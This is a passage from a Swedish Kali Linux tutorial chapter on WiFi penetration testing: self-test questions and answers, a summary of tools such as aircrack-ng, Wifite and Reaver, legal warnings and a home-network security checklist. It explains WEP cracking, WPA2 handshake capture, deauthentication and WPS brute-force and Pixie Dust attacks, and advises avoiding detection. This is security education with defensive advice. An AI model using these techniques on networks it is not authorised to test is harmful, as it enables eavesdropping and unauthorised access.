[ ] Default admin-lösenord ändrat?
[ ] Firmware uppdaterat (senaste versionen)?
[ ] SSID ändrat från default (ej "NETGEAR", "Linksys")?
[ ] Gäst-nätverk separerat från huvudnätverk?
[ ] Remote administration inaktiverat?

# 3. Testa med Wifite/Reaver (endast ditt eget nätverk!)

# 4. Dokumentera resultat och förbättra säkerheten
```

---

## ✅ Självtest {#självtest}

### Frågor

1. **Vad är skillnaden mellan "Managed Mode" och "Monitor Mode"?**

2. **Varför är WEP-kryptering osäker och hur lång tid tar det att knäcka?**

3. **Vad är en "WPA2 4-way handshake" och varför behöver vi fånga den?**

4. **Förklara WPS-sårbarheten. Varför är det endast ~11,000 möjliga PINs istället för 100 miljoner?**

5. **Vad gör en "deauthentication attack" och varför används den?**

6. **Vilka är de tre huvudverktygen i Aircrack-ng suite och vad gör de?**

7. **Vad är "Pixie Dust attack" och hur snabbt kan den knäcka WPS?**

8. **Nämn tre säkerhetsåtgärder för att skydda ett WiFi-nätverk.**

9. **Varför är "packet injection" viktigt för WiFi-hacking?**

10. **Vilket är det bästa sättet att säkra ett WiFi-nätverk idag?**

---

### Svar

<details>
<summary>Klicka för att visa svar</summary>

1. **Managed Mode:** Ansluter till EN access point, filtrerar paket till andra enheter, normal WiFi-användning.
   **Monitor Mode:** Lyssnar på ALLA WiFi-paket på en kanal, kan se trafik till andra enheter, krävs för WiFi-hacking.

2. **WEP-osäkerhet:** Använder RC4-kryptering med återanvändning av Initialization Vectors (IVs). Statistiska svagheter gör att nyckeln kan återställas efter ~50,000 insamlade paket. **Tid:** < 5 minuter med aircrack-ng.

3. **4-way handshake** = Autentiseringsprocess mellan klient och router vid WPA2-anslutning. Den innehåller kryptografiska data som kan användas för offline dictionary attack. Vi fångar den för att sedan testa lösenord utan att vara ansluten till nätverket.

4. **WPS-sårbarhet:** WPS PIN valideras i två delar (4+4 siffror). Första 4 siffror = 10,000 kombinationer. Andra 3 siffror = 1,000 kombinationer (sista är checksum). Total = 11,000 istället för 10^8. Detta gör brute-force möjligt på 4-8 timmar.

5. **Deauth attack:** Skickar deautentiseringspaket som tvingar klient att koppla ner från WiFi. När klienten återansluter sker en ny handshake som vi kan fånga. Används för att accelerera handshake-capture istället för att vänta tåligt.

6. Tre huvudverktyg:
   - **airodump-ng:** Paketfångst och nätverksscanning
   - **aireplay-ng:** Packet injection (deauth, fake auth, replay)
   - **aircrack-ng:** Lösenordsknäckning (WEP/WPA/WPA2)

7. **Pixie Dust:** Exploaterar svag random number generation i vissa routrars WPS-implementation. Istället för att brute-force alla PINs, kan den återskapa PIN matematiskt. **Tid:** < 10 sekunder till 2 minuter på sårbara routrar.

8. Tre säkerhetsåtgärder:
   - **Inaktivera WPS** (eliminerar WPS-sårbarhet)
   - **Använd WPA2/WPA3 med starkt lösenord** (20+ tecken, slumpmässigt)
   - **Regelbundna firmware-uppdateringar** (patcha sårbarheter)

   Andra: WPA2-Enterprise, wireless IDS, MAC-filtrering, gäst-nätverk.

9. **Packet injection** gör det möjligt att skicka custom WiFi-paket. Behövs för:
   - Deauth-attacker (tvinga handshake)
   - ARP replay (accelerera WEP IV-insamling)
   - Fake authentication
   - Evil Twin-attacker

10. **Bästa sättet:**
    - **WPA3** (om tillgängligt) eller **WPA2** med AES
    - **Starkt lösenord** (20+ tecken, slumpmässigt, lösenordshanterare)
    - **WPS inaktiverat** helt
    - **WPA2-Enterprise med RADIUS** (för företag)
    - **Regelbundna firmware-uppdateringar**
    - **Separerat gäst-nätverk**

</details>

---

## 📝 Sammanfattning {#sammanfattning}

### Vad Du Lärt Dig

✅ WiFi-grunderna (802.11, WEP, WPA, WPA2, WPA3, WPS)
✅ Monitor mode och packet injection
✅ Aircrack-ng suite (airodump, aireplay, aircrack)
✅ WPA2 handshake capture och cracking
✅ Wifite för automatiserade attacker
✅ Reaver och WPS-exploatering (standard + Pixie Dust)
✅ Deauthentication-attacker
✅ Detektering och motåtgärder för WiFi-säkerhet
✅ Juridiska och etiska aspekter (EXTRA viktigt för wireless!)

### Verktygsöversikt

| Verktyg | Primär Användning | Styrka |
|---------|-------------------|--------|
| **airmon-ng** | Aktivera monitor mode | Enkel, pålitlig |
| **airodump-ng** | Paketfångst, scanning | Visar alla nätverk |
| **aireplay-ng** | Packet injection, deauth | Kraftfull, flexibel |
| **aircrack-ng** | WEP/WPA cracking | Snabb, effektiv |
| **Wifite** | Automatiserad attack | Nybörjarvänlig, all-in-one |
| **Reaver** | WPS PIN brute-force | Effektiv mot WPS |
| **Wash** | WPS detection | Identifierar sårbara routrar |

### Bästa Praxis

🟢 **Använd kompatibel adapter** (Alfa AWUS036NHA rekommenderas)
🟢 **Testa alltid Pixie Dust först** (snabbare än standard Reaver)
🟢 **Håll low profile** (låga hastigheter, undvik detektering)
🟢 **Dokumentera ALLT** vid penetrationstester
🟢 **Informera klient** om planerade wireless-tester
🟢 **Isolera testmiljö** (använd Faraday cage vid möjligt)

### 🔴 Juridiska och Etiska Påminnelser

- ❌ Attackera ALDRIG WiFi-nätverk utan explicit skriftligt tillstånd
- ❌ "Testa grannarnas säkerhet" är BROTT (även om välment)
- ❌ Även scanning kan vara olagligt i vissa jurisdiktioner
- ✅ Wireless attacks är EXTRA allvarliga juridiskt (avlyssning)
- ✅ Testa endast DINA EGNA nätverk eller med pentest-kontrakt
- ✅ Använd testmiljöer (egen hotspot, isolerade labbar)
- ✅ MAC-adresser loggas - du KAN spåras

### Skydda Ditt Eget Nätverk

```
🛡️ SÄKERHETS-CHECKLISTA

✅ WPA2 eller WPA3 (ALDRIG WEP)
✅ WPS INAKTIVERAT
✅ Lösenord 20+ tecken (slumpmässigt)
✅ Default admin-credentials ändrade
✅ Firmware uppdaterat
✅ SSID ändrat från default
✅ Gäst-nätverk separerat
✅ Remote administration av
✅ Regelbundna säkerhetsaudits
```

### Nästa Steg

➡️ **[Nivå 5: Post-Exploitation & Advanced Topics](niva-5-post-exploitation.md)**
   - Privilege escalation
   - Persistence
   - Lateral movement
   - Data exfiltration
   - Covering tracks

---

## 🎓 Redo för Nästa Nivå?

### Checklista innan Du Fortsätter

- [ ] Jag förstår WiFi-krypteringsprotokoll (WEP, WPA, WPA2, WPS)
- [ ] Jag kan sätta adapter i monitor mode
- [ ] Jag har testat packet injection
- [ ] Jag kan scanna WiFi-nätverk med airodump-ng
- [ ] Jag förstår hur WPA2 handshake fungerar
- [ ] Jag har testat Wifite (på eget nätverk eller lab)
- [ ] Jag förstår WPS-sårbarheten
- [ ] Jag kan använda Reaver för WPS-attacker
- [ ] Jag förstår de JURIDISKA RISKERNA med wireless attacks
- [ ] Jag har säkrat mitt eget hemmanätverk

**✅ Alla checkboxar markerade?** Du är redo för **Nivå 5: Post-Exploitation**!

---

[🏠 Tillbaka till huvudguiden](../KALI_LINUX_GUIDE_2025.md) | [⬅️ Nivå 4C Del 2: Online Password Attacks](niva-4c-password-attacks-pt2.md) | [➡️ Nivå 5: Post-Exploitation](niva-5-post-exploitation.md)

---

**📅 Senast uppdaterad:** 2025-01-18
**✍️ Författare:** Victory Redovisning Kali Linux Guide Project
**📄 Licens:** Endast för utbildningsändamål

---

**📡 "With great WiFi hacking power comes great legal responsibility. Test only what you own."**
